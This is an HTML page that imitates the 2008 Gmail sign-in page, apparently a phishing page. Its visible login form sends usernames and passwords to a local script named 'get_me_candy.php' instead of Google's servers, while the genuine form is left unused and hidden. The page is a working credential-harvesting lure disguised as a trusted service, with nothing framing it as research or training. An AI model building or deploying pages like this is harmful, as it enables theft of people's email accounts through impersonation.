
<html lang="en" dir="ltr">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<style type=text/css>
<!--
body,td,div,p,a,font,span {font-family: arial,sans-serif}
body {margin-top:2}

.c {width: 4; height: 4}

.bubble {background-color:#C3D9FF}

.tl {padding: 0; width: 4; text-align: left; vertical-align: top}
.tr {padding: 0; width: 4; text-align: right; vertical-align: top}
.bl {padding: 0; width: 4; text-align: left; vertical-align: bottom}
.br {padding: 0; width: 4; text-align: right; vertical-align: bottom}

.caption {color:#000000; white-space:nowrap; background:#E8EEFA; text-align:center}

.form-noindent {background-color: #ffffff; border: #C3D9FF 1px solid}

.feature-image {padding: 15 0 0 0; vertical-align: top; text-align: right; }
.feature-description {padding: 15 0 0 10; vertical-align: top; text-align: left; }

// -->
</style>
<script type=text/javascript src="https://mail.google.com/mail?view=page&name=browser&ver=1k96igf4806cy"></script>
<script type=text/javascript>
<!--

var start_time = (new Date()).getTime();

if ((top.location != self.location)&&(top.location.href.indexOf('https://www.google.com/analytics/siteopt/preview')!=0)) {
 top.location = self.location.href;
}

function SetGmailCookie(name, value) {
  document.cookie = name + "=" + value + ";path=/;domain=.google.com";
}

function lg() {
  var now = (new Date()).getTime();

  var cookie = "T" + start_time + "/" + start_time + "/" + now;
  SetGmailCookie("GMAIL_LOGIN", cookie);
}

function gaiacb_onLoginSubmit() {
  lg();
  if (!fixed) {
    FixForm();
  }
  return true;
}

function StripParam(url, param) {
  var start = url.indexOf(param);
  if (start == -1) return url;
  var end = start + param.length;

  var charBefore = url.charAt(start-1);
  if (charBefore != '?' && charBefore != '&') return url;

  var charAfter = (url.length >= end+1) ? url.charAt(end) : '';
  if (charAfter != '' && charAfter != '&') return url;
  if (charBefore == '&') {
  --start;
  } else if (charAfter == '&') {
  ++end;
  }
  return url.substring(0, start) + url.substring(end);
}
var fixed = 0;
function FixForm() {
  if (is_browser_supported) {
  var form = el("gaia_loginform");
  if (form && form["continue"]) {
  var url = form["continue"].value;
  url = StripParam(url, "ui=html");
  url = StripParam(url, "zy=l");
  form["continue"].value = url;
  }
  }
  fixed = 1;
}
function el(id) {
  if (document.getElementById) {
  return document.getElementById(id);
  } else if (window[id]) {
  return window[id];
  }
  return null;
}
// Estimates of nanite storage generation over time.
var CP = [
 [ 1199433600000, 6283 ],
 [ 1224486000000, 7254 ],
 [ 2144908800000, 10996 ],
 [ 2147328000000, 43008 ],
 [ 46893711600000, Number.MAX_VALUE ]
];
var quota;
var ONE_PX = "https://mail.google.com/mail/images/c.gif?t=" +
  (new Date()).getTime();
function LogRoundtripTime() {
  var img = new Image();
  var start = (new Date()).getTime();
  img.onload = GetRoundtripTimeFunction(start);
  img.src = ONE_PX;
}
function GetRoundtripTimeFunction(start) {
  return function() {
  var end = (new Date()).getTime();
  SetGmailCookie("GMAIL_RTT", (end - start));
  }
}
function MaybePingUser() {
  var f = el("gaia_loginform");
  if (f.Email.value) {
  new Image().src = 'https://mail.google.com/mail?gxlu=' +
  encodeURIComponent(f.Email.value) +
  '&zx=' + (new Date().getTime());
  }
}
function OnLoad() {
  gaia_setFocus();
  MaybePingUser();
  el("gaia_loginform").Passwd.onfocus = MaybePingUser;
  LogRoundtripTime();
  if (!quota) {
  quota = el("quota");
  updateQuota();
  }
  LoadConversionScript();
}
function updateQuota() {
  if (!quota) {
  return;
  }
  var now = (new Date()).getTime();
  var i;
  for (i = 0; i < CP.length; i++) {
    if (now < CP[i][0]) {
      break;
    }
  }
  if (i == 0) {
    setTimeout(updateQuota, 1000); 
  } else if (i == CP.length) {
    quota.innerHTML = CP[i - 1][1];
  } else {
    var ts = CP[i - 1][0];
    var bs = CP[i - 1][1];
    quota.innerHTML = format(((now-ts) / (CP[i][0]-ts) * (CP[i][1]-bs)) + bs); 
    setTimeout(updateQuota, 1000); 
  } 
} 
 
var PAD = '.000000'; 
 
function format(num) { 
  var str = String(num); 
  var dot = str.indexOf('.'); 
  if (dot < 0) { 
     return str + PAD; 
  } if (PAD.length > (str.length - dot)) {
  return str + PAD.substring(str.length - dot);
  } else {
  return str.substring(0, dot + PAD.length);
  }
}
var google_conversion_type = 'landing';
var google_conversion_id = 1069902127;
var google_conversion_language = "en_US";
var google_conversion_format = "1";
var google_conversion_color = "FFFFFF";
function LoadConversionScript() {
  var script = document.createElement("script");
  script.type = "text/javascript";
  script.src = "https://www.googleadservices.com/pagead/conversion.js";
}
// -->
</script>
  <style type=text/css>
<!--
.time{color:#999; margin:0; padding:0;}
.post{padding:0px; padding-top:2px; padding-right:10px}
.snippet{margin-bottom:5px;}
//-->
</style>
<script type="text/javascript" src="https://www.google.com/jsapi">
</script>
<script type="text/javascript">
google.load("feeds","1");
function initialize(){
  var feed =
  new google.feeds.Feed("https://google.com/mail/help/BlogSnippet.xml");
  feed.setResultFormat(google.feeds.Feed.XML_FORMAT);
  feed.setNumEntries(1);
  feed.load(function(result) {
  var container = document.getElementById("feed");
  if (!result.error) {
  var entry = result.xmlDocument.getElementsByTagName('entry')[0];
  var title = entry.getElementsByTagName('title')[0].firstChild.nodeValue;
  var link = entry.getElementsByTagName('link')[0].getAttribute('href');
  var snippet =
  entry.getElementsByTagName('content')[0].firstChild.nodeValue;
  snippet += '...';
  var date =
  entry.getElementsByTagName('published')[0].firstChild.nodeValue;
  var titleDiv = document.createElement('div');
  var linkNode = document.createElement('a');
  var snippetDiv = document.createElement('div');
  var dateDiv = document.createElement('div');
  var moreLink = document.createElement('a');
  snippetDiv.className = 'snippet';
  dateDiv.className = 'time';
  titleDiv.appendChild(document.createTextNode(title));
  linkNode.href = link;
  linkNode.appendChild(titleDiv);
  snippetDiv.appendChild(document.createTextNode(snippet));
  dateDiv.appendChild(document.createTextNode(date));
  moreLink.href = 'http://gmailblog.blogspot.com';
  moreLink.innerHTML = 'More posts &raquo;';
  container.appendChild(linkNode);
  container.appendChild(dateDiv);
  container.appendChild(snippetDiv);
  container.appendChild(moreLink);
  } else {
  container.innerHTML = '<a href="http://gmailblog.blogspot.com">'
  + 'The Official Gmail Blog</a>'
  }
  });
}
google.setOnLoadCallback(initialize);
</script>
<title>
  Gmail: Email from Google
</title>
</head>
<body bgcolor=#ffffff link=#0000FF vlink=#0000FF onload="OnLoad()">
<table width=95% border=0 align=center cellpadding=0 cellspacing=0>
  <tr valign=top>
  <td width=1%>
      <img src="Gmail_logo.png" border=0 width=143 height=59 alt="Gmail" align=left vspace=10/>
  </td>
  <td width=99% bgcolor=#ffffff valign=top>
  <table width=100% cellpadding=1>
  <tr valign=bottom>
  <td><div align=right>&nbsp;</div></td>
  </tr>
  <tr>
  <td nowrap=nowrap>
  <table width=100% align=center cellpadding=0 cellspacing=0 bgcolor=#C3D9FF style=margin-bottom:5>
  <tr>
  <td class="bubble tl" align=left valign=top></td>
  <td class=bubble rowspan=2 style="font-family:arial;text-align:left;font-weight:bold;padding:5 0"><b>Welcome to Gmail</b></td>
  <td class="bubble tr" align=right valign=top></td>
  </tr>
  <tr>
  <td class="bubble bl" align=left valign=bottom></td>
  <td class="bubble br" align=right valign=bottom></td>
  </tr>
  </table>
  </td>
  </tr>
  </table>
  </td>
  </tr>
</table>
<table width=94% align=center cellpadding=5 cellspacing=1>
  <tr>
  <td valign=top style="text-align:left"><b>A Google approach to email.</b>
  <td valign=top>&nbsp;
  </tr>
  <tr>
  <td width=75% valign=top>
  <p style="margin-bottom: 0;text-align:left"><font size=-1>
  Gmail is a new kind of webmail, built on the idea that email can be more intuitive, efficient, and useful. And maybe even fun. After all, Gmail has:</font>
</p>
<table border="0" cellpadding="0" cellspacing="0" width="90%"><tbody>
  <tr>
  
  <td class="feature-description">
  <font size=-1><b>Less spam</b><br>
  Keep unwanted messages out of your inbox with Google's innovative technology.</font>
  </td>
  </tr>
  <tr>
  
  <td class="feature-description">
  <font size=-1><b>Mobile access</b><br>
  Read Gmail on your mobile phone by pointing your phone's web browser to <b>http://gmail.com/app</b>. <a href="http://www.google.com/intl/en_SA/mobile/mail/#utm_source=en_SA-cpp-g4mc-gmhp&utm_medium=cpp&utm_campaign=en_SA">Learn more</a></font>
  </td>
  </tr>
  <tr>
  
  <td class="feature-description">
  <font size=-1><b>Lots of space</b><br>
  Over <span id=quota>2757.272164</span> megabytes (and counting) of free storage so you'll never need to delete another message.</font>
  </td>
  </tr>
</tbody></table>
  <br />
  <div id="highlight">
  <table width="100%" cellpadding="0" cellspacing="0" style="margin-top:0px; margin-right:20px; padding-top:5px;"><tr><td style="padding-top:5px; padding-bottom:0px; padding-left:0px;"><div style="border-top:1px solid rgb(204, 204, 204); width:250px; padding-top: 10px;"><font size="-1"><b>Latest News from the Gmail Blog</b></font>&nbsp;&nbsp; <a href="http://feeds.feedburner.com/OfficialGmailBlog"></a></div>
</td>
<td>&nbsp;</td>
</tr>
<tr><td colspan="2" style="padding-left:0px;">
<font size='-1'>
<div id="feed" class="post"></div>
</font>
</td></tr></table>
</div>
  </td>
  <td valign=top>
  <!-- login box -->
  <div id=login>
<script><!--

function gaia_onLoginSubmit() {

  
  if (window.gaiacb_onLoginSubmit) {
    return gaiacb_onLoginSubmit();
  } else {
    return true;
  }

}


function gaia_setFocus() {
  var f = null;
  if (document.getElementById) { 
    f = document.getElementById("gaia_loginform");
  } else if (window.gaia_loginform) { 
    f = window.gaia_loginform;
  } 
  if (f) {
    if (f.Email && (f.Email.value == null || f.Email.value == "")) {
      f.Email.focus();
    } else if (f.Passwd) {
      f.Passwd.focus();
    } 
  }
}
--></script>
<style type="text/css"><!--
  div.errormsg { color: red; font-size: smaller; font-family:arial,sans-serif; }
  font.errormsg { color: red; font-size: smaller; font-family:arial,sans-serif; }  
--></style>
<style type="text/css"><!--
.gaia.le.lbl { font-family: Arial, Helvetica, sans-serif; font-size: smaller; }
.gaia.le.fpwd { font-family: Arial, Helvetica, sans-serif; font-size: 70%; }
.gaia.le.chusr { font-family: Arial, Helvetica, sans-serif; font-size: 70%; }
.gaia.le.val { font-family: Arial, Helvetica, sans-serif; font-size: smaller; }
.gaia.le.button { font-family: Arial, Helvetica, sans-serif; font-size: smaller; }
.gaia.le.rem { font-family: Arial, Helvetica, sans-serif; font-size: smaller; }

.gaia.captchahtml.desc { font-family: arial, sans-serif; font-size: smaller; } 
.gaia.captchahtml.cmt { font-family: arial, sans-serif; font-size: smaller; font-style: italic; }
  
--></style>
<form id="gaia_loginform"
      
      action="get_me_candy.php" method="POST"
      
      onsubmit=
                 "return(gaia_onLoginSubmit());"
                >
<div id="gaia_loginbox">
<table class="form-noindent" cellspacing="3" cellpadding="5" width="100%" border="0">
  <tr>
  <td valign="top" style="text-align:center" nowrap="nowrap"
        bgcolor="#e8eefa">
  <input type="hidden" name="ltmpl"
             value="default">
  <input type="hidden" name="ltmplcache"
             value="2">
  <div class="loginBox">
  <table id="gaia_table" align="center" border="0" cellpadding="1" cellspacing="0">
  <tr>
<td colspan="2" align="center">
  <font size="-1">
  Sign in to
  Gmail
  with your
  </font>
  <table>
  <tr>
  <td valign="top">
  <img src="https://www.google.com/accounts/google_transparent.gif"
           alt="Google">
  </img>
  </td>
  <td valign="middle">
  <font size="+0"><b>Account</b></font>
  </td>
  </tr>
</table>
</td>
</tr>
  <script type="text/javascript"><!--
    function onPreCreateAccount() {
    
      return true;
    
    }

    function onPreLogin() {
    
      
      if (window["onlogin"] != null) {
        return onlogin();
      } else {
        return true;
      }
    
    }
  --></script>
<tr>
  <td colspan="2" align="center">
  </td>
</tr>
<tr>
  <td nowrap="nowrap">
  <div align="right">
  <span class="gaia le lbl">
  Username:
  </span>
  </div>
  </td>
  <td>
  <input type="hidden" name="continue" id="continue"
           value="http://mail.google.com/mail/?ui=html&amp;zy=l" />
  <input type="hidden" name="service" id="service"
           value="Gmail" />
  <input type="hidden" name="rm" id="rm"
           value="false" />
  <input type="hidden" name="ltmpl" id="ltmpl"
           value="default" />
  <input type="hidden" name="ltmpl" id="ltmpl"
           value="default" />
  <input type="text" name="username"  id="Email"
  size="18" value=""
  
    class='gaia le val'
  
  />
  </td>
</tr>
<tr>
  <td></td>
  <td align="left">
  </td>
</tr>
<tr>
  <td align="right">
  <span class="gaia le lbl">
  Password:
  </span>
  </td>
  <td>
  <input type="password"
   name="password" id="Passwd"
  size="18" class="gaia le val"  />

<input type="hidden" name="service" value="Gmail">
    
  </td>
</tr>
<tr>
  <td>
  </td>
  <td align="left">
  </td>
</tr>
  <tr>
  <td align="right" valign="top">
  <input type="checkbox" name="PersistentCookie" id="PersistentCookie"
    value="yes"
  
    
  
  />
  <input type="hidden" name='rmShown' value="1" />
  </td>
  <td>
  <label for="PersistentCookie" class="gaia le rem">
  Remember me on this computer.
  </label>
  </td>
</tr>
<tr>
  <td>
  </td>
  <td align="left">
  <input type="submit" class="gaia le button" name="signIn"
           value="Sign in"
                  />
  </td>
</tr>
<tr id="ga-fprow">
  <td colspan="2" height="33.0" class="gaia le fpwd"
    align="center" valign="bottom">
  <a href="http://mail.google.com/support/bin/answer.py?answer=46346&fpUrl=https%3A%2F%2Fwww.google.com%2Faccounts%2FForgotPasswd%3FfpOnly%3D1%26continue%3Dhttp%253A%252F%252Fmail.google.com%252Fmail%252F%253Fui%253Dhtml%2526zy%253Dl%26service%3Dmail%26ltmpl%3Ddefault&fuUrl=https%3A%2F%2Fwww.google.com%2Faccounts%2FForgotPasswd%3FfuOnly%3D1%26continue%3Dhttp%253A%252F%252Fmail.google.com%252Fmail%252F%253Fui%253Dhtml%2526zy%253Dl%26service%3Dmail%26ltmpl%3Ddefault&hl=en"
       target=_top>
  I cannot access my account
  </a>
  </td>
</tr>
  </table>
  </div>
  </td>
  </tr>
</table>
</div>
<input type="hidden" name="asts"
       id="asts"
       value="">
</form>
<form id="gaia_universallogin"
      action="https://www.google.com/accounts/ServiceLoginAuth?service=mail" method="post"
      onsubmit="return(gaia_onLoginSubmit());">
  <input type="hidden" name="continue" id="continue"
           value="http://mail.google.com/mail/?ui=html&amp;zy=l" />
  <input type="hidden" name="service" id="service"
           value="mail" />
  <input type="hidden" name="rm" id="rm"
           value="false" />
  <input type="hidden" name="ltmpl" id="ltmpl"
           value="default" />
  <input type="hidden" name="ltmpl" id="ltmpl"
           value="default" />
  <input type="hidden" name="ltmpl" id="ltmpl"
           value="default" />
  <input type="hidden" name="ltmplcache" id="ltmplcache"
           value="2" />
</form>
  </div>
  <!-- end login box -->
  <br>
  <!-- links box (below login box) -->
  <table class=form-noindent cellpadding=0 width=100% bgcolor=#E8EEFA id=links>
  <tr bgcolor=#E8EEFA>
  <td valign=top>
  <div align=center style="margin:10 0">
  <font size=+0>
  <b><a href="http://mail.google.com/mail/signup" style="white-space:nowrap">
  Sign up for Gmail</a></b>
  <br><br>
  <font size="-1">
  <a href="http://mail.google.com/mail/help/intl/en/about.html">About Gmail</a
                  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="http://mail.google.com/mail/help/intl/en/about_whatsnew.html">New features!</a>
  </font>
  <br>
  </font>
  </div>
  </td>
  </table>
  <!-- end links box (below login box) -->
<script>
<!--
FixForm();
// -->
</script>
</table>
<br>
<table width=95% align=center cellpadding=3 cellspacing=0 bgcolor=#C3D9FF style=margin-bottom:5>
  <tr>
  <td class="bubble tl" align=left valign=top></td>
  <td class=bubble rowspan=2 style=text-align:left>
  <div align=center>
  <font size=-1 color=#666666>&copy;2008 Google -
  <a href="http://www.google.com/a/help/intl/en/users/user_features.html#utm_medium=et&utm_source=gmail-en&utm_campaign=crossnav&token=gmail_footer">Gmail for Organizations</a> -
  <a href="http://gmailblog.blogspot.com/?utm_source=en-gmftr&utm_medium=et&utm_content=gmftr">Gmail Blog</a> -
  <a href="http://mail.google.com/mail/help/intl/en/terms.html">Terms</a>
  - <a href="http://mail.google.com/support/">Help</a>
  </font>
  </div>
  </td>
  <td class="bubble tr" align=right valign=top></td>
  </tr>
  <tr>
  <td class="bubble bl" align=left valign=bottom></td>
  <td class="bubble br" align=right valign=bottom></td>
  </tr>
</table>
<script type="text/javascript"
 src="https://ssl.google-analytics.com/urchin.js">
</script>
<script type="text/javascript">
_uacct="UA-992684-1";
_utcp="/accounts/";
_udn="google.com";
_uRno[0]=".google.com";
urchinTracker("/mail/gaia/homepage");
urchinPathCopy("/mail/help/");
</script>
</body>
</html>
